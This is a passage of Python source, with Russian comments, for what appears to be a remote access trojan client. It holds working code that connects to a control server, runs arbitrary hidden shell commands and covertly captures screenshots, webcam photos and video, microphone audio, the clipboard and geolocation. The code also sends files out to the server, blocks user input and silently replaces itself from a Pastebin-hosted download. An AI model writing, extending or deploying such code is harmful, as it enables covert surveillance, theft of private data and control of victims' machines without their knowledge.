    except requests.RequestException as e:
        _send(f"Ошибка загрузки: {e}")
    except Exception as e:
        _send(f"Ошибка Неизвестная ошибка: {e}")
        # удаляем недокачанный файл
        try:
            if "save_path" in locals() and os.path.exists(save_path):
                os.remove(save_path)
        except:
            pass
                   
def cmd_execute_worker(args: str, conn: socket.socket, send_response_func):
    """
    РАБОЧАЯ функция, которая выполняется в ОТДЕЛЬНОМ потоке.
    Она блокируется, но это безопасно, так как не блокирует основной цикл.
    Использует РАБОЧИЙ механизм отправки файлов (send_response с is_file=True).
    """
    TELEGRAM_TEXT_LIMIT = 4000
    
    # --- Внутренняя функция для отправки ответа ---
    def worker_send_response(message=None, is_error=False, is_file=False, file_path=None):
        # 🔥 Мы используем существующую функцию send_response (строка ~947) 
        # Она обрабатывает is_file=True и отправляет файл через /response_file, 
        # что является РАБОЧИМ механизмом.
        if is_error:
            logger.error(f"Ошибка в worker: {message}")
        
        # Если message=None, send_response сам генерирует сообщение об успехе (строка ~960)
        send_response_func(conn, message, cmd_name="/execute", is_file=is_file, file_path=file_path)
    
    try:
        # 1. Логика запуска GUI-команд (для немедленного ответа)
        is_gui_command = any(ext in args.lower() for ext in ['.exe', '.com', '.bat']) or any(app in args.lower() for app in ['mspaint', 'notepad', 'calc', 'explorer'])
        
        if os.name == 'nt' and is_gui_command:
            # Немедленно запускаем процесс, не ждем его.
            subprocess.Popen(
                args, 
                shell=True,
                creationflags=(subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            )
            response = f"✅ GUI-приложение '{args}' запущено в фоновом режиме. Вывода не будет."
            worker_send_response(response)
            return # Выходим
        
        # 2. Логика для консольных команд (блокировка только в этом потоке)
        result = subprocess.run(
            args, 
            shell=True, 
            capture_output=True, 
            text=True, 
            encoding='cp866', 
            errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW
            # 🔥 Здесь нет таймаута, как вы и просили. Поток ждет, пока команда завершится.
        )
        
        # 3. Обработка вывода
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()
        
        full_output = []
        if stdout:
            full_output.append("--- СТАНДАРТНЫЙ ВЫВОД (STDOUT) ---\n" + stdout)
        if stderr:
            full_output.append("--- ОШИБКИ (STDERR) ---\n" + stderr)
            
        final_text = "\n\n".join(full_output)
        
        if not final_text:
             response = f"Команда выполнена успешно, но вывод отсутствует (Код: {result.returncode})."
        else:
            response = final_text

        # 4. Проверка длины и отправка результата
        if len(response) > TELEGRAM_TEXT_LIMIT:
            # Сохраняем файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='_execute.txt', delete=False, encoding='utf-8') as tmp:
                tmp.write(f"КОМАНДА: {args}\n" + "="*(len(args)+10) + "\n\n")
                tmp.write(response)
                temp_file_path = tmp.name
            
            # 🔥 Отправляем файл, используя рабочий механизм send_response
            worker_send_response(message=None, is_file=True, file_path=temp_file_path) 
            
            # Файл будет удален функцией send_response (строка ~978) после отправки.
            
        else:
            # Отправляем единственную строку-ответ
            worker_send_response(response)

    except Exception as e:
        worker_send_response(f"❌ Критическая ошибка выполнения команды: {e}", is_error=True)
        
def cmd_execute(args: str):
    """
    Обертка. Запускает worker в потоке и возвращает None, 
    чтобы главный цикл не отправлял ответ "Принято".
    """
    if not args:
        return "❌ Укажите команду для выполнения."
        
    # БЕЗОПАСНО получаем сокет и функции отправки
    with socket_lock:
        conn = current_socket
        response_func = send_response # Ваша функция отправки ответа
        
    if not conn:
        return "❌ Нет активного соединения. Команда не будет выполнена."
        
    # Запуск рабочей функции в отдельном потоке (НЕ БЛОКИРУЕТ ГЛАВНЫЙ ЦИКЛ)
    threading.Thread(
        target=cmd_execute_worker, 
        args=(args, conn, response_func), 
        daemon=True
    ).start()
    
    # КЛЮЧЕВОЙ МОМЕНТ: Возвращаем None.
    # Это говорит главному циклу: "Ответ будет отправлен в другом месте, ничего не делай."
    return None

# ====== Отправка файлов ======
def send_file(conn, file_path):
    """
    Отправляет файл на Сервер.
    """
    if not os.path.exists(file_path):
        return f"❌ Файл не найден: {file_path}"

    try:
        file_size = os.path.getsize(file_path)
        file_name = os.path.basename(file_path)

        # 1. Отправка заголовка (метаданных)
        header = json.dumps({
            "command": "/upload",
            "file_name": file_name,
            "file_size": file_size
        }).encode('utf-8') + b'\n' # ВАЖНО: \n в конце заголовка
        conn.sendall(header)

        # 2. Отправка бинарных данных
        with open(file_path, 'rb') as f:
            while True:
                bytes_read = f.read(8192)
                if not bytes_read:
                    break
                conn.sendall(bytes_read)
        
        return None # Успех

    except Exception as e:
        return f"❌ Ошибка при отправке файла: {str(e)}"

def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
    """Отправляет ответный JSON с результатом команды на сервер, опционально с файлом."""
    global current_thread_id 
    
    thread_id_to_send = current_thread_id if current_thread_id is not None else 0 

    try:
        if is_file and file_path and os.path.exists(file_path):
            # 1. Отправка метаданных (JSON)
            response_data = {
                "thread_id": thread_id_to_send,
                "command": "/response_file", # Сигнал для Сервера
                "file_name": os.path.basename(file_path),
                "result": f"✅ Вывод команды {cmd_name} отправлен как файл."
            }
            response = json.dumps(response_data).encode('utf-8') + b'\n'
            conn.sendall(response)
            
            # 2. Отправка размера файла и тела файла
            file_size = os.path.getsize(file_path)
            conn.sendall(str(file_size).encode('utf-8') + b'\n') 
            
            # 🔥 Ключевой момент: Чтение по пути и отправка бинарных данных
            with open(file_path, 'rb') as f:
                data = f.read()
                conn.sendall(data)
            
            os.remove(file_path) # Удаляем временный файл

        else:
            # Отправка обычного текста
            response_data = {
                "thread_id": thread_id_to_send,
                "command": cmd_name,
                "result": str(result)
            }
            response = json.dumps(response_data).encode('utf-8') + b'\n'
            conn.sendall(response)

    except Exception as e:
        logger.error(f"Ошибка отправки ответа/файла: {e}")
# ====== Скриншоты и фото (Добавлен ответ) ======
def cmd_screenshot(args, conn):
    logger.debug(f"Выполняется /screenshot с аргументами: {args}")
    temp_path = None
    try:
        temp_path = os.path.join(os.environ['TEMP'], 'screenshot.jpg')
        # ... (логика создания скриншота осталась прежней) ...
        for attempt in range(3):
            pyautogui.screenshot(temp_path)
            if os.path.getsize(temp_path) > 1024:
                img = cv2.imread(temp_path)
                cv2.imwrite(temp_path, img, [int(cv2.IMWRITE_JPEG_QUALITY), 95])
                break
            time.sleep(0.5)
        else:
            if temp_path and os.path.exists(temp_path):
                 os.remove(temp_path)
            send_response(conn, "❌ Не удалось сделать скриншот")
            return None
            
        error = send_file(conn, temp_path)
        send_response(conn, error or "✅ Скриншот отправлен")
        return None
    except Exception as e:
        send_response(conn, f"❌ Скриншот: {str(e)}")
        return None
    finally:
        if temp_path and os.path.exists(temp_path):
            os.remove(temp_path)


def find_available_cameras():
    """
    Пытается найти доступные камеры, используя простой вызов, 
    чтобы избежать конфликтов с бэкэндами.
    """
    index = 0
    available_cameras = 0
    # Проверяем до 10 индексов
    while index < 10: 
        cap = cv2.VideoCapture(index) 
        if cap.isOpened():
            available_cameras += 1
            cap.release()
        else:
            # Эвристика: если 3 последовательных индекса недоступны, останавливаем поиск.
            if available_cameras > 0 and index - available_cameras >= 3:
                 break
        index += 1
    return available_cameras

def cmd_photo(args, conn):
    """
    Делает снимок с веб-камеры по указанному индексу (по умолчанию 0). 
    Если индекс не указан, возвращает список доступных камер.
    """
    logger.debug(f"Выполняется /photo с аргументами: {args}")
    temp_path = None
    
    # 1. ОПРЕДЕЛЕНИЕ ИНДЕКСА КАМЕРЫ ИЛИ ВЫВОД СПИСКА
    camera_index = 0 # По умолчанию
    is_index_specified = False
    
    if args.isdigit():
        camera_index = int(args)
        is_index_specified = True
    elif args.strip():
        send_response(conn, "❌ /photo: Индекс камеры должен быть числом.")
        return

    # Если аргументы не указаны, показываем доступные камеры
    if not is_index_specified:
        num_cams = find_available_cameras()
        if num_cams == 0:
            send_response(conn, "❌ Веб-камеры не найдены.")
        else:
            # Сообщение с явным указанием индексов, доступных для использования
            send_response(conn, f"✅ Найдено {num_cams} камер (индексы 0 - {num_cams-1}). Используйте /photo <индекс>.")
        return

    try:
        # 2. ЗАХВАТ ИЗОБРАЖЕНИЯ С ВЫБРАННОГО ИНДЕКСА
        # 🔥 Используем простой вызов cv2.VideoCapture(index), который работал
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            send_response(conn, f"❌ Камера с индексом {camera_index} недоступна. Попробуйте другой индекс.")
            return

        ret = False
        frame = None
        # Прогрев и захват (ваш рабочий код)
        for _ in range(10):
            ret, frame = cap.read()
            if ret:
                break
            time.sleep(0.2)
            
        cap.release()

        if not ret or frame is None:
            send_response(conn, "❌ Не удалось получить изображение.")
            return

        # 3. Сохранение, проверка размера и отправка
        temp_path = os.path.join(os.environ['TEMP'], f'webcam_{int(time.time())}.jpg')
        cv2.imwrite(temp_path, frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])

        if os.path.getsize(temp_path) < 1024:
            os.remove(temp_path)
            send_response(conn, "❌ Изображение слишком маленькое")
            return

        error = send_file(conn, temp_path)
        
        send_response(conn, error or f"✅ Фото с камеры {camera_index} отправлено")
        
    except Exception as e:
        send_response(conn, f"❌ Фото (Критическая ошибка): {str(e)}")
    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except Exception as e:
                logger.error(f"Не удалось удалить временный файл: {e}")

# ====== Auto (Запускается в отдельном потоке) ======
def auto_job(interval, capture_screen, capture_webcam, camera_index):
    # Эта функция выполняется в отдельном потоке
    while not stop_event.wait(interval):
        try:
            # Сокет должен быть доступен только для записи в этом потоке
            conn = current_socket 
            if conn and conn.fileno() != -1:
                if capture_screen:
                    # Вызываем функции, которые сами обрабатывают сокет через socket_lock
                    cmd_screenshot("", conn)
                if capture_webcam:
                    cmd_photo(str(camera_index), conn)
        except Exception as e:
            logger.error(f"Auto ошибка: {e}")
            time.sleep(1)

def cmd_auto(args, conn):
    global auto_thread
    logger.debug(f"Выполняется /auto с аргументами: {args}")
    try:
        parts = args.split()
        if not parts:
            return "❌ /auto <сек> [screen|webcam|both] [camera_index]"
        
        interval = float(parts[0])
        if interval <= 0:
            return "❌ Интервал > 0"

        # режим: screen / webcam / both
        mode = parts[1].lower() if len(parts) > 1 else "both"
        capture_screen = "screen" in mode or "both" in mode
        capture_webcam = "webcam" in mode or "both" in mode

        # индекс камеры (если есть)
        camera_index = 0
        if len(parts) > 2:
            if parts[2].isdigit():
                camera_index = int(parts[2])
            else:
                return "❌ Индекс камеры должен быть числом."

        if auto_thread and auto_thread.is_alive():
            return "❌ Уже запущено (/stop)"

        stop_event.clear()
        auto_thread = threading.Thread(
            target=auto_job,
            args=(interval, capture_screen, capture_webcam, camera_index),
            daemon=True
        )
        auto_thread.start()
        return f"✅ Auto каждые {interval}с (камера {camera_index})"

    except Exception as e:
        return f"❌ {str(e)}"


def cmd_stop(args):
    global auto_thread
    if auto_thread and auto_thread.is_alive():
        stop_event.set()
        auto_thread.join(timeout=5)
        auto_thread = None
        return "✅ Auto остановлено"
    return "❌ Auto не запущено"
# ====== Новые команды (Аудио- и Видеозапись) ======

def cmd_mic(args, conn):
    """
    Records audio for a specified duration and sends the WAV file.
    Usage: /mic [seconds] (Default 5s, Max 30s)
    """
    logger.debug(f"Выполняется /mic с аргументами: {args}")
    WAVE_OUTPUT_FILENAME = None
    
    try:
        record_time = 5
        if args.strip().isdigit():
            # Ограничиваем время записи 1-30 секундами
            record_time = max(1, min(30, int(args.strip()))) 

        # 1. Настройки
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1 # Используем 1 канал для лучшей совместимости
        RATE = 44100
        
        temp_dir = tempfile.gettempdir()
        WAVE_OUTPUT_FILENAME = os.path.join(temp_dir, f"mic_rec_{int(time.time())}.wav")

        p = pyaudio.PyAudio()
        send_response(conn, f"✅ Начата запись аудио на {record_time} секунд...")

        # 2. Запись
        stream = p.open(format=FORMAT,
                         channels=CHANNELS,
                         rate=RATE,
                         input=True,
                         frames_per_buffer=CHUNK)

        frames = []
        num_frames = int(RATE / CHUNK * record_time)
        
        for i in range(0, num_frames):
            # exception_on_overflow=False предотвращает сбой при переполнении буфера
            data = stream.read(CHUNK, exception_on_overflow=False) 
            frames.append(data)

        # 3. Остановка
        stream.stop_stream()
        stream.close()
        p.terminate()

        # 4. Сохранение в WAV
        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            
        # 5. Отправка
        error = send_file(conn, WAVE_OUTPUT_FILENAME)
        send_response(conn, error or f"✅ Аудио отправлено ({record_time}с)")

    except Exception as e:
        send_response(conn, f"❌ Микрофон (Критическая ошибка): {str(e)}")
    finally:
        if WAVE_OUTPUT_FILENAME and os.path.exists(WAVE_OUTPUT_FILENAME):
            os.remove(WAVE_OUTPUT_FILENAME)


def cmd_webcam_video(args, conn):
    """
    Records video from a specified webcam for a duration.
    Usage: /webcam <index> <seconds> (Max 30s)
    """
    logger.debug(f"Выполняется /webcam с аргументами: {args}")
    output_file = None
    
    try:
        parts = args.strip().split()
        if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
            send_response(conn, "❌ Формат: /webcam <индекс> <секунды>")
            return
            
        camera_index = int(parts[0])
        record_time = max(1, min(30, int(parts[1]))) # Ограничение 30с

        # 1. Инициализация
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            send_response(conn, f"❌ Камера с индексом {camera_index} недоступна.")
            return

        # Получаем реальные размеры кадра (для VideoWriter)
        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        # 2. Настройка VideoWriter
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_dir = tempfile.gettempdir()
        output_file = os.path.join(temp_dir, f"webcam_vid_{int(time.time())}.avi")
        
        # Используем .avi для XVID
        output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (frame_width, frame_height)) 

        send_response(conn, f"✅ Начата запись видео с камеры {camera_index} на {record_time} секунд...")
        
        # 3. Запись
        start_time = time.time()
        
        while time.time() - start_time < record_time:
            ret, frame = cap.read()
            if ret:
                output_v.write(frame)
            else:
                time.sleep(0.05) 
                
        # 4. Освобождение ресурсов
        cap.release()
        output_v.release()
        
        # 5. Отправка
        error = send_file(conn, output_file)
        send_response(conn, error or f"✅ Видео ({record_time}с) отправлено")

    except Exception as e:
        send_response(conn, f"❌ Видео с веб-камеры: {str(e)}")
    finally:
        if output_file and os.path.exists(output_file):
            os.remove(output_file)


def cmd_screenrecord(args, conn):
    """
    Records screen video for a specified duration and sends the MKV file.
    Usage: /screenrecord <seconds> (Max 60s)
    """
    logger.debug(f"Выполняется /screenrecord с аргументами: {args}")
    output_file = None
    
    try:
        if not args.strip().isdigit():
            send_response(conn, "❌ Формат: /screenrecord <секунды>")
            return
            
        record_time = max(1, min(60, int(args.strip()))) # Ограничение 60с
        FPS = 10.0

        # 1. Инициализация
        screen_width, screen_height = pyautogui.size()
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_dir = tempfile.gettempdir()
        output_file = os.path.join(temp_dir, f"screen_rec_{int(time.time())}.avi")
        
        output_video = cv2.VideoWriter(output_file, fourcc, FPS, (screen_width, screen_height))

        send_response(conn, f"✅ Начата запись экрана на {record_time} секунд...")
        
        # 2. Запись
        start_time = time.time()
        
        while time.time() - start_time < record_time:
            # Делаем скриншот
            screenshot = pyautogui.screenshot()
            
            # Конвертируем скриншот в массив numpy (np)
            frame = np.array(screenshot)
            
            # Конвертируем цвета из RGB (pyautogui) в BGR (OpenCV)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

            output_video.write(frame)
            
            # Пауза для контроля FPS
            time.sleep(max(0, 1/FPS - (time.time() - start_time) % (1/FPS))) 

        # 3. Освобождение ресурсов
        output_video.release()
        
        # 4. Отправка
        error = send_file(conn, output_file)
        send_response(conn, error or f"✅ Запись экрана ({record_time}с) отправлена")
        
    except Exception as e:
        send_response(conn, f"❌ Запись экрана (Критическая ошибка): {str(e)}")
    finally:
        if output_file and os.path.exists(output_file):
            os.remove(output_file)

def cmd_location(args, conn):
    try:
        # 1. Внешний IP
        ip_resp = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip_resp.raise_for_status()
        public_ip = ip_resp.json().get("ip", "неизвестно")

        # 2. Геолокация
        geo_resp = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=10)
        geo_resp.raise_for_status()
        data = geo_resp.json()

        if data.get("status") != "success":
            send_response(conn, f"IP: {public_ip}\nГеолокация недоступна.")
            return

        # 3. Чистый текст
        lines = [
            f"IP (внешний): {public_ip}",
            f"IP (локальный): {socket.gethostbyname(socket.gethostname())}",
            f"Страна: {data.get('country', '—')}",
            f"Регион: {data.get('regionName', '—')}",
            f"Город: {data.get('city', '—')}",
            f"Провайдер: {data.get('isp', '—')}",
            f"Организация: {data.get('org', '—')}",
            f"Часовой пояс: {data.get('timezone', '—')}",
            f"Координаты: {data.get('lat')}, {data.get('lon')}",
        ]

        # Убираем строки с "—", если нужно
        lines = [line for line in lines if not line.endswith("—")]

        # 4. Отправляем
        send_response(conn, "\n".join(lines))

    except Exception as e:
        send_response(conn, f"Ошибка: {e}")

# ====== Download (Запускается в отдельном потоке) ======
def cmd_download(args, conn):
    logger.debug(f"Выполняется /download с аргументами: {args}")
    try:
        file_path = os.path.normpath(os.path.join(current_path, args.strip()))
        if not os.path.isfile(file_path):
            send_response(conn, "❌ Файл не найден")
            return None
        if os.path.getsize(file_path) > 50 * 1024 * 1024:
            send_response(conn, "❌ >50MB")
            return None
            
        error = send_file(conn, file_path)
        send_response(conn, error or "✅ Файл отправлен")
        return None
    except Exception as e:
        send_response(conn, f"❌ Download: {str(e)}")
        return None

# ====== Upload (Обрабатывает буфер и приём файла) ======
# Оставили drain_socket для очистки сокета от мусора
def drain_socket(conn, bytes_to_drain):
    try:
        conn.settimeout(5)
        drained = 0
        while drained < bytes_to_drain:
            chunk = conn.recv(min(8192, bytes_to_drain - drained))
            if not chunk:
                break
            drained += len(chunk)
    except:
        pass
    finally:
        conn.settimeout(None)

def cmd_upload(payload, conn, initial_data=b''):
    """
    Обрабатывает команду /upload: читает метаданные и тело файла
    из сокета и записывает файл на диск.
    """
    global current_path # Убедитесь, что current_path определен глобально
    logger.debug(f"Upload: {len(initial_data)} initial bytes")
    
    save_path = None
    file_size = 0  # Инициализируем для блока except
    received = 0   # Инициализируем для блока except
    
    try:
        file_name = payload.get("file_name")
        file_size = int(payload.get("file_size", 0))
        
        # 1. Валидация
        if not file_name or file_size <= 0 or file_size > 50 * 1024 * 1024:
            # Если имя отсутствует или некорректно, очищаем сокет
            drain_socket(conn, file_size - len(initial_data))
            return "❌ Неверные метаданные (имя файла или размер)"
            
        # 2. Формирование пути
        # 💥 ЭТО ОБЕСПЕЧИВАЕТ ПЕРЕИМЕНОВАНИЕ: Используется file_name, присланный сервером
        save_path = os.path.join(current_path, file_name)
        
        if os.path.exists(save_path):
            # Если файл уже существует, надо очистить сокет от данных, чтобы не зависнуть
            drain_socket(conn, file_size - len(initial_data))
            return "❌ Файл существует"
            
        # 3. Чтение и запись файла
        received = len(initial_data)
        conn.settimeout(60) # Увеличиваем таймаут для больших файлов
        
        # Предполагается, что file_lock - это threading.Lock()
        with file_lock:
            with open(save_path, 'wb') as f:
                if initial_data:
                    f.write(initial_data)
                
                while received < file_size:
                    # Читаем оставшиеся данные
                    chunk = conn.recv(min(8192, file_size - received))
                    if not chunk:
                        raise ConnectionError("Разрыв")
                    f.write(chunk)
                    received += len(chunk)
        
        conn.settimeout(None) # Сбрасываем таймаут
        
        # 4. Проверка полноты и финальный отчет
        if received != file_size:
            # Если не все принято, удаляем файл
            if os.path.exists(save_path):
                os.remove(save_path)
            return f"❌ Неполный ({received}/{file_size})"
            
        return f"✅ {file_name} загружен ({received}B)"
        
    except Exception as e:
        # В случае ошибки пытаемся очистить сокет от оставшихся данных файла
        try:
            # Используем max(0, ...) для безопасного расчета оставшихся байтов
            bytes_to_drain = max(0, file_size - received - len(initial_data))
            drain_socket(conn, bytes_to_drain)
        except:
            pass
            
        # Удаляем недописанный файл
        if save_path and os.path.exists(save_path):
            os.remove(save_path)
            
        return f"❌ Upload: {str(e)}"


def cmd_update(args, conn):
    """
    Команда /update: Проверяет обновление через Pastebin raw URL.
    Аргумент: raw URL Pastebin (например, https://pastebin.com/raw/XXXXXX)
    Формат Pastebin: "Ver X - https://direct.link/to/new_client.exe"
    Если версия выше текущей, скачивает и заменяет exe.
    """
    if not args.strip():
        return "❌ Укажите raw URL Pastebin: /update https://pastebin.com/raw/XXXXXX"
    
    pastebin_url = "https://pastebin.com/raw/v25titFe"
    
    try:
        # 1. Скачиваем содержимое Pastebin
        response = requests.get(pastebin_url)
        response.raise_for_status()
        content = response.text.strip()
        
        # 2. Парсим: "Ver X - link"
        if not content.startswith("Ver "):
            return "❌ Некорректный формат Pastebin. Ожидается: 'Ver X - link'"
        
        parts = content.split(" - ", 1)
        if len(parts) != 2:
            return "❌ Некорректный формат. Ожидается: 'Ver X - link'"
        
        ver_str = parts[0][4:].strip()  # Извлекаем X после "Ver "
        download_link = parts[1].strip()
        
        new_version = int(ver_str)
        
        # 3. Проверяем версию
        if new_version <= CURRENT_VERSION:
            return f"ℹ️ Клиент уже на актуальной версии (текущая: {CURRENT_VERSION}, доступная: {new_version})."
        
        # 4. Скачиваем новый exe
        send_response(conn, f"✅ Обнаружена новая версия {new_version}. Скачивание...")
        
        new_exe_response = requests.get(download_link, stream=True)
        new_exe_response.raise_for_status()
        
        # Получаем путь к текущему exe (sys.executable для PyInstaller)
        current_exe = sys.executable
        temp_exe = os.path.join(os.path.dirname(current_exe), f"new_client_{new_version}.exe")
        
        with open(temp_exe, 'wb') as f:
            for chunk in new_exe_response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # 5. Создаем BAT для замены (Windows-only)
        bat_path = os.path.join(os.path.dirname(current_exe), "update.bat")
        bat_content = f"""@echo off
timeout /t 2 /nobreak >nul
taskkill /f /im "{os.path.basename(current_exe)}" >nul 2>&1
copy /Y "{temp_exe}" "{current_exe}"
del "{temp_exe}"
start "" "{current_exe}"
del "%~f0"
"""
        with open(bat_path, 'w') as bat_file:
            bat_file.write(bat_content)
        
        # 6. Запускаем BAT и завершаем текущий процесс
        subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
        send_response(conn, "✅ Обновление скачано. Клиент перезапустится для применения.")
        
        # Завершаем текущий процесс (BAT подождет и заменит)
        os._exit(0)
        
    except requests.RequestException as e:
        return f"❌ Ошибка скачивания: {e}"
    except ValueError:
        return "❌ Некорректная версия в Pastebin (должна быть числом)."
    except Exception as e:
        return f"❌ Критическая ошибка обновления: {e}"



def cmd_open_image(args, conn):
    """
    Открывает изображение в полноэкранном режиме поверх всех окон на заданное время.
    Решена проблема с кириллицей в путях и усилен эффект "поверх других окон".
    Формат: /open_image <секунды> <путь к файлу>
    """
    global current_path, file_lock
    logger.debug(f"Выполняется /open_image с аргументами: {args}")
    
    # Имя окна
    window_name = f"fullscreen_image_viewer_{os.getpid()}" 
    
    try:
        # ... (Парсинг аргументов остается прежним)
        parts = args.strip().split(None, 1)
        if len(parts) < 2:
            send_response(conn, "❌ Формат: /open_image <секунды> <путь к файлу>")
            return
        
        # ... (Проверка секунд остается прежней)
        try:
            seconds = int(parts[0])
            if seconds <= 0:
                send_response(conn, "❌ Время должно быть > 0 секунд.")
                return
        except ValueError:
            send_response(conn, "❌ Неверный формат времени. Укажите число секунд.")
            return

        user_path = parts[1]
        
        # 2. Валидация и чтение пути (Обновленная логика)
        with file_lock:
            # 1. Объединяем путь
            full_path = os.path.join(current_path, user_path)
            
            # 2. Получаем абсолютный, нормализованный путь
            full_path = os.path.abspath(full_path) 
            
            # 3. ПРОВЕРЯЕМ СУЩЕСТВОВАНИЕ (Для кириллицы os.path.isfile часто работает лучше,
            # если ей передать нормализованный путь)
            if not os.path.isfile(full_path):
                send_response(conn, f"❌ Файл не найден: {full_path}")
                return
        
        logger.debug(f"Попытка чтения изображения по абсолютному пути: {full_path}")
        
        # 3. Чтение изображения с поддержкой кириллицы (Остается прежней, т.к. она верна)
        # Читаем файл как бинарный массив
        with open(full_path, 'rb') as f:
            data = f.read()
        
        # Преобразуем бинарные данные в массив numpy и декодируем его как изображение
        np_arr = np.frombuffer(data, np.uint8)
        image = cv2.imdecode(np_arr, cv2.IMREAD_UNCHANGED)
        
        if image is None:
            send_response(conn, "❌ Не удалось прочитать файл (возможно, это не изображение).")
            return

    except Exception as e:
        send_response(conn, f"❌ Ошибка подготовки: {e}")
        return

    # 4. Показ (Усиление эффекта "поверх всех окон")
    try:
        # 1. Создаем окно с флагом WND_PROP_FULLSCREEN
        cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
        
        # 2. Устанавливаем свойство WINDOW_FULLSCREEN
        cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        
        # 🔥 3. Дополнительно устанавливаем TOPMOST (сделать поверх других), 
        # хотя WINDOW_FULLSCREEN уже должен это делать.
        cv2.setWindowProperty(window_name, cv2.WND_PROP_TOPMOST, 1)

        # 4. Показываем изображение
        cv2.imshow(window_name, image)
        
        send_response(conn, f"✅ Изображение '{user_path}' открыто на {seconds} сек. (Поверх всех)")

        # 5. Ждем N миллисекунд ИЛИ нажатия любой клавиши.
        cv2.waitKey(seconds * 1000) 
        
    except Exception as e:
        send_response(conn, f"❌ Ошибка во время показа изображения (GUI/Full-Screen): {e}")
    finally:
        # Гарантированное закрытие окна
        cv2.destroyAllWindows() 
        cv2.waitKey(1)

        
# ====== Словарь команд ======
COMMANDS = {
    "/ls": cmd_ls,
    "/cd": cmd_cd,
    "/back": cmd_back,
    "/pwd": cmd_pwd,
    "/mkdir": cmd_mkdir,
    "/delete": cmd_delete,
    "/rename": cmd_rename,
    "/copy": cmd_copy,
    "/run": cmd_run,
    "/move": cmd_move,
    "/msg": cmd_msg,
    "/wallpaper": cmd_wallpaper,
    "/volumeplus": cmd_volumeplus,
    "/volumeminus": cmd_volumeminus,
    "/download_link": cmd_download_link,
    "/sysinfo": cmd_sysinfo,
    "/execute": cmd_execute,
    "/changeclipboard": cmd_changeclipboard,
    "/minimize": cmd_minimize,
    "/maximize": cmd_maximize,
    "/version": cmd_version,
    "/cmdbomb": cmd_cmdbomb,
    "/altf4": cmd_altf4,
    "/restart": cmd_restart, 
    "/mousemove": cmd_mousemove,
    "/mouseclick": cmd_mouseclick,
    "/playsound": lambda args: None,
    "/stopsound": lambda args: None,
    "/mousemesstop": cmd_mousemesstop,
    "/block": block_input,
    "/unblock": unblock_input,
    "/clipboard": get_clipboard_content,
    "/keytype": simulate_key_type,
    "/ping": cmd_ping,  
    "/mic": cmd_mic,            
    "/webcam": cmd_webcam_video, 
    "/open_image": cmd_open_image,
    "/screenrecord": cmd_screenrecord,
    "/location": cmd_location,
    "/mousemesstart": cmd_mousemesstart,
    "/tasklist": cmd_tasklist,   
    "/taskkill": cmd_taskkill,   
    "/keypress": cmd_keypress, 
    "/screenshot": cmd_screenshot,
    "/sc": cmd_screenshot,
    "/photo": cmd_photo,
    "/auto": cmd_auto,
    "/stop": cmd_stop,
    "/download": cmd_download,
    "/upload": cmd_upload,
    "/update": cmd_update,
}

# ====== Главный цикл (ИСПРАВЛЕН) ======
def main_client_loop():
    global current_socket
    
    try:
        # Устанавливаем рабочий каталог в папку, где находится исполняемый файл
        os.chdir(os.path.dirname(os.path.abspath(sys.executable)))
    except Exception as e:
        logger.error(f"Не удалось установить рабочий каталог: {e}")

    while True:
        conn = None
        buffer = b''
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            conn.connect((SERVER_IP, SERVER_PORT))
            logger.info("Подключено")
            handshake = json.dumps({"client_id": CLIENT_ID}, ensure_ascii=False).encode('utf-8') + b'\n'
            conn.sendall(handshake)
            
            try:
                cmd_screenshot("", conn)
                cmd_location("", conn)
            except Exception as e:
                logger.error(f"Ошибка автозапуска: {e}")

            # Обновляем глобальный сокет для использования в auto_job и send_file
            with socket_lock:
                current_socket = conn

            hb_stop_event.clear()
            hb_thread = threading.Thread(target=client_heartbeat_loop, daemon=True)
            hb_thread.start()

            while True:
                # Читаем данные. Если данных нет, цикл разрывается.
                data = conn.recv(8192)
                if not data:
                    break
                
                buffer += data
                
                while b'\n' in buffer:
                    line, buffer = buffer.split(b'\n', 1)
                    try:
                        payload = json.loads(line.decode('utf-8'))
                        command = payload.get("command", "").strip()
                        if not command:
                            continue
                            
                        cmd_name = command.split()[0]
                        args = command[len(cmd_name):].strip()
                        func = COMMANDS.get(cmd_name)
                        
                        result = None # Инициализируем результат
                        
                        if not func:
                            result = "❌ Неизвестно"
                        
                        elif cmd_name in {"/upload", "/auto", "/update", "/location"}:
                             # /upload уже получает payload + остаток буфера
                            if cmd_name == "/upload":
                                 result = func(payload, conn, buffer)
                                 buffer = b''
                            else:
                                 result = func(args, conn)          # <-- передаём conn

                        elif cmd_name in ["/screenshot", "/sc", "/photo", "/download", "/mic", "/webcam", "/screenrecord", "/open_image"]:
                            # Долгосрочные операции: запуск в отдельном потоке. Они сами отправляют результат.
                            threading.Thread(target=func, args=(args, conn), daemon=True).start()
                            result = None

                        elif cmd_name == "/restart": 
